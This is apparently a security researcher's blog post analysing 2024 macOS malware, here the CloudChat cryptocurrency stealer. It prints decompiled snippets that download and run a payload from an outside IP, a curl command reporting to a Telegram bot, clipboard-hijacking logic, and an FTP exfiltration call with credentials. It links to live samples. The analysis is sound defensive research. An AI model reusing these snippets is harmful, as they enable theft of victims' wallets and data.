Title: The Mac Malware of 2024 üëæ

URL Source: https://objective-see.org/blog/blog_0x7D.html

Markdown Content:
The Mac Malware of 2024 üëæ

A comprehensive analysis of the year's new macOS malware

by: Patrick Wardle / January 1, 2025

  

The **Objective-See Foundation** is supported by:

  

üìù üëæ Want to play along?

The majority of samples covered in this post are available in our [malware collection](https://objective-see.com/malware.html).

...just please don't infect yourself! üòÖ

  

### ‚åõ Background

Goodbye 2024 ‚Ä¶and hello 2025! ü•≥

For what is now the 9th year in a row, I‚Äôve put together a blog post that comprehensively covers all the new Mac malware that emerged throughout the year.

While the specimens may have been reported on before (for example by the AV company that discovered them), this blog aims to cumulatively and comprehensively cover **_all_** the new Mac malware of 2024 - in much technical detail, all in one place ‚Ä¶yes, with samples available for download!

After reading this blog post you will have a thorough and comprehensive understanding of latest threats targeting macOS. This is especially important as Macs continue to flourish, with researchers at MacPaw‚Äôs Moonlock Lab [noting](https://moonlock.com/moonlock-2024-macos-threat-report) a ‚Äú_60 percent increase \[of macOS\] in market share in the last 3 years alone_‚Äù.

Looking forward, others predict the [full dominance](https://www.computerworld.com/article/3679730/jamf-q3-data-confirms-rapid-mac-adoption-across-the-enterprise.html) of macOS (in the enterprise) the end of the decade:

> "_Mac will become the dominant enterprise endpoint by 2030._" -Jamf

Predictably macOS malware follows a similar trajectory, becoming ever more prevalent (and well, insidious).

> "_2024 saw a noteworthy increase in malicious activity targeting macOS users, with significant growth in both the variety and accessibility of macOS malware.The darknet was flooded with posts and discussions on bypassing macOS defenses, leveraging AI tools for malware development, and capitalizing on social engineering to distribute macOS malware-as-a-service (MaaS).
> 
> _" -Moonlock Labs

  

In this blog post, we focus on new Mac malware specimens that appeared in 2024. Adware and/or malware from previous years, are not covered.

That having been said, at the end of this blog, I‚Äôve included a [section](https://objective-see.org/blog/blog_0x7D.html#still-notable) dedicated to notable instances or developments of these other threats, that includes a brief overview, and links to detailed write-ups.

For each malicious specimen covered in this post, we‚Äôll discuss the malware‚Äôs:

*   **Infection Vector**:  
    How it was able to infect macOS systems.
    
*   **Persistence Mechanism**:  
    How it installed itself, to ensure it would be automatically restarted on reboot/user login.
    
*   **Features & Goals**:  
    What was the purpose of the malware? a backdoor? a stealer? or something more insidious‚Ä¶
    

Also, for each malware specimen, if a public sample is available, I‚Äôve added a direct download link, should you want to follow along with my analysis or dig into the malware more yourself. #SharingIsCaring

In years past, I've organized the malware by the month of discovery, which worked well when there were not a large number of samples.

However, this year, given the large increase in the number of samples, I‚Äôve decided to organize them by type, for example ransomware, stealers, etc. etc. To me this also makes more sense, as the month of discovery is somewhat irrelevant (at least from a technical point of view).

### üõ†Ô∏è Malware Analysis Tools & Tactics

Before we dive in, let‚Äôs talk about analysis tools!

Throughout this blog, I reference various tools used in analyzing the malware specimens.  
While there are a myriad of malware analysis tools, these are some of my own tools, and other favorites, that include:

*   [`ProcessMonitor`](https://objective-see.com/products/utilities.html#ProcessMonitor)  
    My open-source utility that monitors process creations and terminations, providing detailed information about such events.
    
*   [`FileMonitor`](https://objective-see.com/products/utilities.html#FileMonitor)  
    My open-source utility that monitors file events (such as creation, modifications, and deletions) providing detailed information about such events.
    
*   [`DNSMonitor`](https://objective-see.com/products/utilities.html#DNSMonitor)  
    My open-source utility that monitors DNS traffic providing detailed information domain name questions, answers, and more.
    
*   [`WhatsYourSign`](https://objective-see.com/products/whatsyoursign.html)  
    My open-source utility that displays code-signing information, via the UI.
    
*   [`Netiquette`](https://objective-see.com/products/netiquette.html)  
    My open-source (light-weight) network monitor.
    
*   `lldb`  
    The de-facto commandline debugger for macOS. Installed (to `/usr/bin/lldb`) as part of Xcode.
    
*   [Suspicious Package](https://mothersruin.com/software/SuspiciousPackage/) A tools for ‚Äúinspecting macOS Installer Packages‚Äù (`.pkgs`), which also allows you to easily extract files directly from the .pkg.
    
*   [`Hopper Disassembler`](https://www.hopperapp.com/)  
    A ‚Äúreverse engineering tool (for macOS) that lets you disassemble, decompile and debug your applications‚Äù ‚Ä¶or malware specimens.
    

  

Interested in general Mac malware analysis techniques?

  

Stealers:
---------

Continuing the trend from 2023, the most common type of new macOS malware in 2024, was undoubtedly ‚Äúinfo stealers‚Äù. Such malware is solely focused on collecting and stealing sensitive information from victims machines, such as cookies, password, certificates, crytocurrency wallets, and more:

![Image 39](https://objective-see.org/images/blog/blog_0x7D/stealers.png)

Stealers, an overview

‚Ä¶and, as there isn‚Äôt much need to stick around once this information is obtained, stealers often don‚Äôt persist.

Now, it‚Äôs easy to brush off stealers, however if nothing else, 2024 showed us that stealers were often a precursor to far more damaging attacks:

![Image 40](https://objective-see.org/images/blog/blog_0x7D/stealers_1.png)  
![Image 41](https://objective-see.org/images/blog/blog_0x7D/stealers_2.png)

Stealers ...not to be underestimated!

Ok, enough overview, let‚Äôs now dive into the new macOS stealers of 2024!

### üëæ **`CloudChat`**

CloudChat is fairly standard macOS stealer, focusing on largely on cryptocurrency wallets and keys. However, it does have a few tricks up its sleeve such as monitoring the clipboard. Moreover its use of Telegram as well as FTP (as an exfiltration mechanism) is interesting.

![Image 42](https://objective-see.org/images/download.png) Download: [`CloudChat`](https://github.com/objective-see/Malware/raw/main/CloudChat.zip) (password: `infect3d`)

Kandji researchers [Adam Kohler](https://x.com/AdamJKohler/) and [Christopher Lopez](https://x.com/L0Psec) initially uncovered CloudChat on VirusTotal. Their subsequent analysis, ‚Äú[CloudChat Infostealer: How It Works, What It Does](https://www.kandji.io/blog/cloudchat-infostealer)‚Äù is oft-cited here.

> This was an exciting find that Christopher Lopez and I worked on all weekend! Super proud of being able to get this out! [https://t.co/nHNBuUyC0y](https://t.co/nHNBuUyC0y)[#cybersecurity](https://twitter.com/hashtag/cybersecurity?src=hash&ref_src=twsrc%5Etfw) [#malware](https://twitter.com/hashtag/malware?src=hash&ref_src=twsrc%5Etfw) [#infostealer](https://twitter.com/hashtag/infostealer?src=hash&ref_src=twsrc%5Etfw) [#cryptostealer](https://twitter.com/hashtag/cryptostealer?src=hash&ref_src=twsrc%5Etfw) [#cloudchat](https://twitter.com/hashtag/cloudchat?src=hash&ref_src=twsrc%5Etfw) [#reverseengineering](https://twitter.com/hashtag/reverseengineering?src=hash&ref_src=twsrc%5Etfw) [#kandji](https://twitter.com/hashtag/kandji?src=hash&ref_src=twsrc%5Etfw) [#edr](https://twitter.com/hashtag/edr?src=hash&ref_src=twsrc%5Etfw) [#mdm](https://twitter.com/hashtag/mdm?src=hash&ref_src=twsrc%5Etfw)
> 
> ‚Äî Adam Kohler (@AdamJKohler) [April 8, 2024](https://twitter.com/AdamJKohler/status/1777429179648143667?ref_src=twsrc%5Etfw)

![Image 43](https://objective-see.org/images/blog/blog_0x53/writeup.png) **Writeups:**

*   ‚Äú[CloudChat Cashes Out: Who Needs a C2 Anyways](https://alden.io/posts/cloudchat-returns/)‚Äù (Alden Schmidt)
*   ‚Äú[CloudChat Infostealer: How It Works, What It Does](https://www.kandji.io/blog/cloudchat-infostealer)‚Äù (Kandji)

![Image 44](https://objective-see.org/images/blog/blog_0x53/infect.png) **Infection Vector:** Fake Applications

Though the Kandji report noted they originally discovered the malware on VirusTotal, it was also available on CloudChat‚Äôs website. And what is CloudChat? Spoiler: It is a fake app, but it‚Äôs website claimed that it:

> ‚Äúprovides you with a safe social life service‚Ä¶chat with friends around the world and share your unique and interesting perspectives‚Ä¶use pictures and videos to share your life in the circle of friends or the world‚Ä¶let the world applaud you without worrying about privacy being leaked.‚Äù

If the cybercriminals can get a user to downloand and run the CloudChat, they‚Äôll be infected!

We‚Äôve seen this approach to infecting macOS users before whereas attackers will send their targets meeting invites, then ultimately involve the victim downloading and executing what they believe is a required video-chat application, but is really malware. (See: ‚Äú[Malicious meeting invite fix targets Mac users](https://www.malwarebytes.com/blog/news/2024/03/malicious-meeting-invite-fix-targets-mac-users)‚Äù).

![Image 45](https://objective-see.org/images/blog/blog_0x53/persist.png) **Persistence:** None

Many stealers don‚Äôt persist, and CloudChat is no exception.

![Image 46](https://objective-see.org/images/blog/blog_0x53/capabilities.png) **Capabilities:** Stealer

If an unsuspecting victim runs the CloudChat application, the malicious logic (found within the `libCloudchat.dylib`) will be executed:

![Image 47](https://objective-see.org/images/blog/blog_0x7D/cloudchat_1.png)

CloudChat's libCloudchat.dylib

We can use `otool` to dump the application‚Äôs dependencies, to see (as expected) a dependency on this library:

 % otool -l CloudChat.app/Contents/MacOS/CloudChat  
...
Load command 45
          cmd LC\_LOAD\_DYLIB
      cmdsize 80
         name **@executable\_path/../Frameworks/libCloudchat.dylib (offset 24)**
   time stamp 2 Wed Dec 31 14:00:02 1969
      current version 0.0.0
compatibility version 0.0.0

The Kandji researchers noted that after performing a geolocation check (to avoid infecting victims in China), the malware will downloaded a binary from `45.77.179.89`. Saving it as `.Safari_V8_config` it then executes it:

```
result = _main.downloadFile(..., "http://45.77.179.89/static/clip",);
if (!result) {
    _os.chmod(...);
    _main.executeFileInBackground(...);
}
```

The downloaded binary (`.Safari_V8_config`) what implements the stealer logic. By looking at it method names, we can get a pretty good idea about what it is up to:

```
_main.monitorClipboard
_main.executeOnce
_main.getHostnameAndUsername
_main.copyAndCompressWalletPlugins
_main.compressLogsdata
_main.uploadLogsdata
_main.isValidPrivateKey
_main.replaceAddresses
_main.sendTelegramNotification
```

First (again as noted by the Kandji researchers), it performs a basic survey of the infected system, which is sends to a Telegram bot. The logic for the former can be found in the `getHostnameAndUsername` method, while the latter, in the aptly named `sendTelegramNotification` method. Embedded strings within this method show it (ab)uses `curl` in order to send the telegram notification:

```
curl -m %d -s -X POST -H \'Content-Type: application/json\' -d \'%s\' \'https://api.telegram.org/bot%s/sendMessage\'
```

The `monitorClipboard` method is interesting. Its disassembly reveals it uses an open-source [clipboard](https://github.com/atotto/clipboard) library to monitor the victims clipboard. As items are placed on the clipboard the malware invokes a `isValidPrivateKey` method to see if the item is a private key. If so, as noted by another researcher, Alden, who [also analyzed the malware](https://alden.io/posts/cloudchat-returns/), ‚Äú_\[the malware\] will replace the clipboard contents with an attacker controlled wallet string_‚Äù:

```
while (true) {
    rax_1 = github.com/atotto/clipboard.readAll(...);
    ...

    if(main.isValidPrivateKey(...)) {

        main.replaceAddresses(...);
        github.com/atotto/clipboard.writeAll(...);
    }
}
```

The downloaded binary (`.Safari_V8_config`) also, as is common to many stealers, looks for common cryptocurrency wallets. Specifically, it looks for those that are implemented as Chrome extensions. Any such cryptocurrency wallets are compressed and exfiltrated. Rather unusually, the exfiltration is done via FTP:

```
main.uploadLogsdata() {
    ...
    char* var_50 = "--ftp-create-dirs"
    char* var_30 = "mars:LnW4BhIdjOsVZzK0"
    void* var_20 = "ftp://45.77.179.89/upload/encoun‚Ä¶";
    ...

    os/exec.(*Cmd).Run(_os/exec.Command(..., "curl", ...);
}
```

Details about the remaining new macOS malware, be appended to this blog post each day!

### üíï Support:

Love these blog posts? You can support them via my [Patreon](https://www.patreon.com/bePatron?c=701171) page![![Image 48](https://objective-see.org/images/patreon.png)](https://www.patreon.com/bePatron?c=701171)
